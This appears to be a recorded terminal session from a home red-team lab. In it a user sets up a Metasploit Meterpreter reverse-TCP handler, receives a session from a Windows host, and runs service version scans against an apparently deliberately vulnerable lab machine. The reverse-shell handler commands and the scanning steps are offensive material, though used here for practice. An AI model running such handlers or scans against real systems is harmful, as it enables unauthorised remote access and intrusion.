@@ -1,0 +1,225 @@
+Script iniciado em 2026-05-15 10:51:15-03:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="190" LINES="35"]
+[?2004h]0;nikolay@debian: ~/lab/Red_Team_Repo/04_Enumeration[01;32mnikolay@debian[00m:[01;34m~/lab/Red_Team_Repo/04_Enumeration[00m$ [7mmsfconsole -q[27m
+[7muse exploit/multi/handler[27m
+[7mset PAYLOAD windows/x64/meterpreter/reverse_tcp[27m
+[7mset LHOST 192.168.1.143[27m
+[7mset LPORT 4444[27m
+[7mset ExitOnSession false[27m
+[7mexploit -j[27m[A[A[A[A[A[A]0;nikolay@debian: ~/lab/Red_Team_Repo/04_Enumeration[01;32mnikolay@debian[00m:[01;34m~/lab/Red_Team_Repo/04_Enumeration[00m$ msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.143
+set LPORT 4444
+set ExitOnSession false
+exploit -j
+[?2004l[?1034h[4mmsf[0m [0m> 
+[0m[4mmsf[0m [0m> exit -y[K[Prunset RHOSTS 192.168.1.145[C[C[C[C[C[Cuse auxiliary/scanner/ftp/ftp_version[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[P[Pset RHOSTS 192.168.1.145[C[C[C[C[C[Crun[Kexit -y[K
+[0m[4mmsf[0m [0m> sessions
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf[0m [0m> use exploit/multi/handler
+[0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcp
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+[0m
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set LHOST 192.168.1.143
+[0mLHOST => 192.168.1.143
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set LPORT 4444
+[0mLPORT => 4444
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set ExitOnSession false
+[0mExitOnSession => false
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> exploit -j
+[0m
+[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[34m[*][0m Started reverse TCP handler on 192.168.1.143:4444 
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[1m[34m[*][0m Sending stage (248902 bytes) to 192.168.1.113
+[0m[0m[1m[34m[*][0m Meterpreter session 1 opened (192.168.1.143:4444 -> 192.168.1.113:49727) at 2026-05-15 10:59:54 -0300
+
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> sessions -i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > background
+[0m[1m[34m[*][0m Backgrounding session 1...
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> use auxiliary/scanner/ftp/ftp_version
+[0m[4mmsf[0m auxiliary([1m[31mscanner/ftp/ftp_version[0m) [0m> set RHOSTS 192.168.1.145
+[0mRHOSTS => 192.168.1.145
+[4mmsf[0m auxiliary([1m[31mscanner/ftp/ftp_version[0m) [0m> run
+[0m[1m[32m[+][0m 192.168.1.145:21      - FTP Banner: '220 (vsFTPd 2.3.4)\x0d\x0a'
+[1m[34m[*][0m 192.168.1.145:21      - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mscanner/ftp/ftp_version[0m) [0m> [H[2J[4mmsf[0m auxiliary([1m[31mscanner/ftp/ftp_version[0m) [0m> use auxiliary/scanner/smb/smb_version
+[0m[4mmsf[0m auxiliary([1m[31mscanner/smb/smb_version[0m) [0m> set RHOSTS 192.168.1.145
+[0mRHOSTS => 192.168.1.145
+[4mmsf[0m auxiliary([1m[31mscanner/smb/smb_version[0m) [0m> run
+[0m[1m[34m[*][0m 192.168.1.145:445     - SMB Detected (versions: 1) (preferred dialect: ) (signatures: optional)
+[1m[32m[+][0m 192.168.1.145:445     -   Host is running Unix
+[1m[34m[*][0m 192.168.1.145:445     -   SMB signing is not required
+[1m[34m[*][0m 192.168.1.145         - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mscanner/smb/smb_version[0m) [0m> use auxiliary/scanner/ssh/ssh_version
+[0m[4mmsf[0m auxiliary([1m[31mscanner/ssh/ssh_version[0m) [0m> set RHOSTS 192.168.1.145
+[0mRHOSTS => 192.168.1.145
+[4mmsf[0m auxiliary([1m[31mscanner/ssh/ssh_version[0m) [0m> run
+[0m[1m[34m[*][0m 192.168.1.145 - Key Fingerprint: ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
+[1m[34m[*][0m 192.168.1.145 - SSH server version: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
+[1m[34m[*][0m 192.168.1.145 - Server Information and Encryption
+=================================
+
+  Type                     Value                                 Note
+  ----                     -----                                 ----
+  encryption.compression   none
+  encryption.compression   zlib@openssh.com
+  encryption.encryption    aes128-cbc                            Deprecated
+  encryption.encryption    3des-cbc                              Deprecated
+  encryption.encryption    blowfish-cbc                          Deprecated
+  encryption.encryption    cast128-cbc                           Deprecated
+  encryption.encryption    arcfour128                            Deprecated
+  encryption.encryption    arcfour256                            Deprecated
+  encryption.encryption    arcfour                               Deprecated
+  encryption.encryption    aes192-cbc                            Deprecated
+  encryption.encryption    aes256-cbc                            Deprecated
+  encryption.encryption    rijndael-cbc@lysator.liu.se           Deprecated
+  encryption.encryption    aes128-ctr
+  encryption.encryption    aes192-ctr
+  encryption.encryption    aes256-ctr
+  encryption.hmac          hmac-md5                              Deprecated
+  encryption.hmac          hmac-sha1
+  encryption.hmac          umac-64@openssh.com
+  encryption.hmac          hmac-ripemd160                        Deprecated
+  encryption.hmac          hmac-ripemd160@openssh.com
+  encryption.hmac          hmac-sha1-96                          Deprecated
+  encryption.hmac          hmac-md5-96                           Deprecated
+  encryption.host_key      ssh-rsa
+  encryption.host_key      ssh-dss
+  encryption.key_exchange  diffie-hellman-group-exchange-sha256
+  encryption.key_exchange  diffie-hellman-group-exchange-sha1    Deprecated
+  encryption.key_exchange  diffie-hellman-group14-sha1
+  encryption.key_exchange  diffie-hellman-group1-sha1            Deprecated
+  fingerprint_db           ssh.banner
+  openssh.comment          Debian-8ubuntu1
+  os.cpe23                 cpe:/o:canonical:ubuntu_linux:8.04
+  os.family                Linux
+  os.product               Linux
+  os.vendor                Ubuntu
+  os.version               8.04
+  service.cpe23            cpe:/a:openbsd:openssh:4.7p1
+  service.family           OpenSSH
+  service.product          OpenSSH
+  service.protocol         ssh
+  service.vendor           OpenBSD
+  service.version          4.7p1
+
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mscanner/ssh/ssh_version[0m) [0m> [H[2J[4mmsf[0m auxiliary([1m[31mscanner/ssh/ssh_version[0m) [0m> use auxiliary/scanner/ssh/ssh_version
+[0m[4mmsf[0m auxiliary([1m[31mscanner/ssh/ssh_version[0m) [0m> set RHOSTS 192.168.1.145
+[0mRHOSTS => 192.168.1.145
+[4mmsf[0m auxiliary([1m[31mscanner/ssh/ssh_version[0m) [0m> run
+[0m[1m[34m[*][0m 192.168.1.145 - Key Fingerprint: ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
+[1m[34m[*][0m 192.168.1.145 - SSH server version: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
+[1m[34m[*][0m 192.168.1.145 - Server Information and Encryption
+=================================
+
+  Type                     Value                                 Note
+  ----                     -----                                 ----
+  encryption.compression   none
+  encryption.compression   zlib@openssh.com
+  encryption.encryption    aes128-cbc                            Deprecated
+  encryption.encryption    3des-cbc                              Deprecated
+  encryption.encryption    blowfish-cbc                          Deprecated
+  encryption.encryption    cast128-cbc                           Deprecated
+  encryption.encryption    arcfour128                            Deprecated
+  encryption.encryption    arcfour256                            Deprecated
+  encryption.encryption    arcfour                               Deprecated
+  encryption.encryption    aes192-cbc                            Deprecated
+  encryption.encryption    aes256-cbc                            Deprecated
+  encryption.encryption    rijndael-cbc@lysator.liu.se           Deprecated
+  encryption.encryption    aes128-ctr
+  encryption.encryption    aes192-ctr
+  encryption.encryption    aes256-ctr
+  encryption.hmac          hmac-md5                              Deprecated
+  encryption.hmac          hmac-sha1
+  encryption.hmac          umac-64@openssh.com
+  encryption.hmac          hmac-ripemd160                        Deprecated
+  encryption.hmac          hmac-ripemd160@openssh.com
+  encryption.hmac          hmac-sha1-96                          Deprecated
+  encryption.hmac          hmac-md5-96                           Deprecated
+  encryption.host_key      ssh-rsa
+  encryption.host_key      ssh-dss
+  encryption.key_exchange  diffie-hellman-group-exchange-sha256
+  encryption.key_exchange  diffie-hellman-group-exchange-sha1    Deprecated
+  encryption.key_exchange  diffie-hellman-group14-sha1
+  encryption.key_exchange  diffie-hellman-group1-sha1            Deprecated
+  fingerprint_db           ssh.banner
+  openssh.comment          Debian-8ubuntu1
+  os.cpe23                 cpe:/o:canonical:ubuntu_linux:8.04
+  os.family                Linux
+  os.product               Linux
+  os.vendor                Ubuntu
+  os.version               8.04
+  service.cpe23            cpe:/a:openbsd:openssh:4.7p1
+  service.family           OpenSSH
+  service.product          OpenSSH
+  service.protocol         ssh
+  service.vendor           OpenBSD
+  service.version          4.7p1
+
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mscanner/ssh/ssh_version[0m) [0m> [H[2J[4mmsf[0m auxiliary([1m[31mscanner/ssh/ssh_version[0m) [0m> use auxiliary/scanner/http/dir_scanner
+[0m[4mmsf[0m auxiliary([1m[31mscanner/http/dir_scanner[0m) [0m> set RHOSTS 192.168.1.145
+[0mRHOSTS => 192.168.1.145
+[4mmsf[0m auxiliary([1m[31mscanner/http/dir_scanner[0m) [0m> run
+[0m[1m[34m[*][0m Detecting error code
+[1m[34m[*][0m Using code '404' as not found for 192.168.1.145
+[1m[32m[+][0m Found http://192.168.1.145:80/cgi-bin/ 403 (192.168.1.145)
+[1m[32m[+][0m Found http://192.168.1.145:80/doc/ 200 (192.168.1.145)
+[1m[32m[+][0m Found http://192.168.1.145:80/icons/ 200 (192.168.1.145)
+[1m[32m[+][0m Found http://192.168.1.145:80/index/ 404 (192.168.1.145)
+[1m[32m[+][0m Found http://192.168.1.145:80/phpMyAdmin/ 200 (192.168.1.145)
+[1m[32m[+][0m Found http://192.168.1.145:80/test/ 404 (192.168.1.145)
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mscanner/http/dir_scanner[0m) [0m> [H[2J[4mmsf[0m auxiliary([1m[31mscanner/http/dir_scanner[0m) [0m> use auxiliary/scanner/mysql/mysql_version
+[0m[1m[34m[*][0m New in Metasploit 6.4 - This module can target a [32mSESSION[0m or an [32mRHOST[0m
+
+[4mmsf[0m auxiliary([1m[31mscanner/mysql/mysql_version[0m) [0m> set RHOSTS 192.168.1.145
+[0mRHOSTS => 192.168.1.145
+[4mmsf[0m auxiliary([1m[31mscanner/mysql/mysql_version[0m) [0m> run
+[0m[1m[32m[+][0m 192.168.1.145:3306 - 192.168.1.145:3306 is running MySQL 5.0.51a-3ubuntu5 (protocol 10)
+[1m[34m[*][0m 192.168.1.145:3306 - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mscanner/mysql/mysql_version[0m) [0m> [H[2J[4mmsf[0m auxiliary([1m[31mscanner/mysql/mysql_version[0m) [0m> use auxiliary/scanner/misc/java_rmi_server
+[0m[4mmsf[0m auxiliary([1m[31mscanner/misc/java_rmi_server[0m) [0m> set RHOSTS 192.168.1.145
+[0m
+RHOSTS => 192.168.1.145
+[4mmsf[0m auxiliary([1m[31mscanner/misc/java_rmi_server[0m) [0m> run
+[0m[1m[32m[+][0m 192.168.1.145:1099    - 192.168.1.145:1099 Java RMI Endpoint Detected: Class Loader Enabled
+[1m[34m[*][0m 192.168.1.145:1099    - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mscanner/misc/java_rmi_server[0m) [0m> [H[2J[4mmsf[0m auxiliary([1m[31mscanner/misc/java_rmi_server[0m) [0m> exit
+[0m[1m[34m[*][0m You have active sessions open, to exit anyway type "exit -y"
+[4mmsf[0m auxiliary([1m[31mscanner/misc/java_rmi_server[0m) [0m> exit -y
+[0mbash: use: comando não encontrado
+bash: exploit: comando não encontrado
+[?2004h]0;nikolay@debian: ~/lab/Red_Team_Repo/04_Enumeration[01;32mnikolay@debian[00m:[01;34m~/lab/Red_Team_Repo/04_Enumeration[00m$ exit
+[?2004lexit
+
+Script concluído em 2026-05-15 11:16:03-03:00 [COMMAND_EXIT_CODE="127"]
